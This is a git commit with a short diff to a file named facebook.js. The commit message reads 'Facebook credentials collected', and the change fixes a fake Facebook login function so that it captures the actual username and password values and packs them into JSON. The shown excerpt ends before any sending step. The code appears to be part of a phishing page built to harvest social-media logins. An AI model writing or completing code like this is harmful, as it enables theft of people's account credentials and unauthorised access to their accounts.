e799e8ecaa2cc4155b2050b985fec62e0fb53872
Monique <moniquewinkjames@outlook.com>
2017-10-28 14:28:41 +1000

    Facebook credentials collected

--- views/javascripts/facebook.js
+++ views/javascripts/facebook.js
@@ -2,13 +2,13 @@
  * Facebook login
  */
 function send() {
-    var username = document.getElementById('username');
-    var password = document.getElementById('password');
+    var username = document.getElementById('username').value;
+    var password = document.getElementById('password').value;
 
     var data = {
         "username": username,
         "password": password
-    }
+    };
 
     var json = JSON.stringify(data);
 
